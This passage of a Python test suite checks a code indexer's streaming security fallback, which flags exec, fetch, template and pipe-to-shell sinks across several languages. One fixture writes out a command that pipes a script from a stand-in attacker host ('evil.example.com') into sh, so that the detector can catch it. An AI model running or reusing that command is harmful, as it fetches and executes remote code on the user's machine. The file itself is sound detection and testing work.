# bundle over 1MB is a routine webpack/esbuild output; a shell installer with
# a huge embedded base64 payload on one line is a routine "curl | bash"
# pattern -- both are realistic triggers, not contrivances.
# ---------------------------------------------------------------------------

def test_giant_line_degradation_is_a_real_route_to_the_streaming_tables() -> None:
    padding = "#" * (DEFAULT_MAX_LINE_BYTES + 1024)
    source = f"#!/bin/bash\n# {padding}\ncurl https://evil.example.com/i.sh | sh\n"

    result = boundary_index_file("install.sh", "shell", source=source.encode("utf-8"))

    assert result["analysis_mode"] == "streaming_security_fallback"
    assert result["degradation_reason"] == "giant_line_resource_limit"
    assert any(
        sink["kind"] == "remote_pipe_to_shell" for sink in result["security_sinks"]
    ), "the extra-sink table must still fire once a real oversized-line degradation lands"


# ---------------------------------------------------------------------------
# Coverage-gap / precision notes worth pinning.
# ---------------------------------------------------------------------------

def test_environment_input_is_case_insensitive_despite_its_uppercase_charclass() -> None:
    """Precision note, not a bug pinned as broken: `_byte_pattern` compiles
    every streaming pattern with `re.IGNORECASE` unconditionally
    (treesitter_index.py ~3648), so shell's `environment_input`
    (`\\$\\{?[A-Z_][A-Z0-9_]*\\}?`, written to look ALL_CAPS-only) actually
    matches any `$variable`, lowercase included. This is not classified
    MISROUTED because a lowercase shell variable substitution is still a
    genuine taint-relevant signal -- just a broader one than the pattern's
    own shape suggests.
    """
    result = index_file("install.sh", "shell", source=SHELL_SOURCES_SRC.encode("utf-8"))
    line = _line_of("echo ${path}", SHELL_SOURCES_SRC)

    matches = [
        s for s in result["security_sources"]
        if s["line"] == line and s["kind"] == "environment_input"
    ]
    assert matches, "a lowercase ${path} substitution still fires environment_input"


def test_dockerfile_instruction_case_insensitivity_is_correct_not_a_bug() -> None:
    """Docker instructions (`ARG`/`ENV`/`CMD`/...) are themselves
    case-insensitive per the Dockerfile spec; IGNORECASE here is the
    intended, correct behaviour, not an accidental broadening like the
    shell case above.
    """
    source = "FROM alpine\narg build_id\nenv api_key=changeme\n"
    result = index_file("Dockerfile", "dockerfile", source=source.encode("utf-8"))

    kinds_by_line = {s["line"]: s["kind"] for s in result["security_sources"]}
    assert kinds_by_line == {2: "build_argument", 3: "build_argument"}


def test_c_and_cpp_include_survives_the_streaming_comment_rule() -> None:
    """`c`/`cpp` are simply not in `_HASH_COMMENT_LANGUAGES` at all now (a
    broader allowlist flip than the brief's original "every language except
    c/cpp" framing), so `#include` is never mistaken for a comment on
    either language's streaming path.
    """
    for language, source in (
        ("c", C_IMPORT_SRC),
        ("cpp", CPP_IMPORT_SRC),
    ):
        result = _stream(source, f"x.{language}", language)
        assert result["imports"], f"{language} imports must survive the comment rule"


@pytest.mark.parametrize(
    ("language", "source", "kind"),
    [
        pytest.param("python", "subprocess.check_output(cmd)\n", "process_exec", id="check-output"),
        pytest.param("python", "subprocess.check_call(cmd)\n", "process_exec", id="check-call"),
        pytest.param("python", "subprocess.getoutput(cmd)\n", "process_exec", id="getoutput"),
        pytest.param(
            "python", "subprocess.getstatusoutput(cmd)\n", "process_exec", id="getstatusoutput"
        ),
        pytest.param(
            "java",
            "Runtime.getRuntime().exec(cmd);\n",
            "process_exec",
            id="java-runtime-exec",
        ),
        *[
            pytest.param(
                "python",
                f"requests.{method}(url)\n",
                "url_fetch",
                id=f"requests-{method}",
            )
            for method in ("post", "put", "patch", "delete", "head", "options", "request")
        ],
    ],
)
def test_streaming_fallback_keeps_expanded_exec_and_ssrf_sinks(
    language: str, source: str, kind: str
) -> None:
    result = _stream(source, f"sink.{ 'java' if language == 'java' else 'py'}", language)

    assert any(sink["kind"] == kind for sink in result["security_sinks"]), result


def test_html_sink_family_misses_erb_style_interpolation_that_its_own_source_pattern_catches() -> None:
    """Coverage gap, not a regression target: `_STREAM_SOURCE_PATTERNS
    ["html"]["template_input"]` matches BOTH `{{...}}` and `<%...%>`, but
    `_STREAM_EXTRA_SINK_PATTERNS["html"]["template_interpolation"]` only
    matches `{{...}}` -- an ERB/JSP/ASP-style `<% value %>` is flagged as a
    tainted-input source but never as an xss sink on the html family,
    asymmetrically.
    """
    result = _stream(HTML_SOURCES_SRC, "index.html", "html")
    erb_line = _line_of("<% value %>", HTML_SOURCES_SRC)

    assert not any(
        sink["kind"] == "template_interpolation" and sink["line"] == erb_line
        for sink in result["security_sinks"]
    )


# ---------------------------------------------------------------------------
# Meta-test: LIVE_CASES must cover every LIVE pattern in the four tables
# this suite owns, and OBSOLETE_PATTERNS must account for the rest.
# ---------------------------------------------------------------------------

# (table, language, pattern) -> reason. Anything in _STREAM_SOURCE_PATTERNS /
# _STREAM_IMPORT_PATTERNS / _STREAM_EXTRA_SINK_PATTERNS /
# _STREAM_EXTRA_ENTRY_PATTERNS not in LIVE_CASES must appear here.
OBSOLETE_PATTERNS: dict[tuple[str, str, str], str] = {
    ("extra_sink", "css", r"\bexpression\s*\("):
        "OBSOLETE -- CSS `expression()` was an Internet Explorer-only "
        "proprietary extension (never implemented by Firefox, Chrome, "
        "Safari, or evergreen Edge); Microsoft ended IE11 desktop support "
        "on 2022-06-15. No 2026 target's CSS -- hand-written or emitted by "
        "any current build tool -- contains this construct. A fixture that "
        "makes it fire would have to write dead IE-only markup on purpose, "
        "which the brief's own rule against contorting fixtures forbids.",
    ("extra_sink", "css", r"\bbehavior\s*:"):
        "OBSOLETE -- same reasoning as css_expression: `behavior:` "
        "(.htc component binding) is exclusively an IE proprietary "
        "feature, retired with IE11 (2022-06-15).",
}


def _real_source_keys() -> set[tuple[str, str, str]]:
    # `(kind, pattern)`, not `(kind, pattern, vuln_classes)`: a source is where
    # untrusted input enters, which is not itself a vulnerability, so the third
    # field carried the non-canonical `tainted-input` marker and nothing read
    # it. The sink tables below still carry real `vuln_classes` and stay 3-wide.
    return {
        ("source", language, pattern)
        for language, entries in treesitter_index._STREAM_SOURCE_PATTERNS.items()
        for _kind, pattern in entries
    }


def _real_import_keys() -> set[tuple[str, str, str]]:
    return {
        ("import", language, pattern)
        for language, entries in treesitter_index._STREAM_IMPORT_PATTERNS.items()
        for pattern in entries
    }


def _real_extra_sink_keys() -> set[tuple[str, str, str]]:
    return {
        ("extra_sink", language, pattern)
        for language, entries in treesitter_index._STREAM_EXTRA_SINK_PATTERNS.items()
        for _kind, pattern, _vuln in entries
    }


def _real_extra_entry_keys() -> set[tuple[str, str, str]]:
    return {
        ("extra_entry", language, pattern)
        for language, entries in treesitter_index._STREAM_EXTRA_ENTRY_PATTERNS.items()
        for _kind, pattern in entries
    }


def test_catalogue_sweep_covers_every_streaming_pattern() -> None:
    real_keys = (
        _real_source_keys()
        | _real_import_keys()
        | _real_extra_sink_keys()
        | _real_extra_entry_keys()
    )
    assert len(real_keys) == 91, (
        f"expected 91 streaming catalogue entries (35 sources + 23 imports + "
        f"25 extra sinks + 8 extra entry points -- includes the powershell and "
        f"blade languages added mid-audit, and the csharp source/import tables "
        f"added with C# tree-sitter support), found {len(real_keys)}. The catalogue "
        f"has drifted since this audit; update LIVE_CASES/OBSOLETE_PATTERNS."
    )

    tested_keys = {(c[0], c[1], c[2]) for c in LIVE_CASES}
    excluded_keys = set(OBSOLETE_PATTERNS)

    missing = real_keys - tested_keys - excluded_keys
    assert not missing, f"untriaged streaming catalogue entries: {sorted(missing)}"

    stale = (tested_keys | excluded_keys) - real_keys
    assert not stale, f"LIVE_CASES/OBSOLETE_PATTERNS reference entries no longer in the catalogue: {sorted(stale)}"

    overlap = tested_keys & excluded_keys
    assert not overlap, f"a pattern cannot be both tested-live and excluded: {sorted(overlap)}"
